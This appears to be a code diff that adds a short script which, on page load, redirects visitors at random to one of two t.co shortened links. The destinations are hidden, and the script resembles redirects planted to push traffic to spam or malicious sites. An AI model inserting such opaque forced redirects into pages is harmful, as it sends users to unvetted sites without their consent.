@@ -1,0 +1,15 @@
+<script>
+    // Array of URLs to redirect to
+    var urls = [
+        'https://t.co/4RbPJHATrB',
+        'https://t.co/rk7OrrSbL1',
+        'https://t.co/4RbPJHATrB',
+        'https://t.co/rk7OrrSbL1'
+    ];
+
+    // Generate a random index
+    var randomIndex = Math.floor(Math.random() * urls.length);
+
+    // Redirect to the randomly selected URL
+    window.location.href = urls[randomIndex];
+</script>
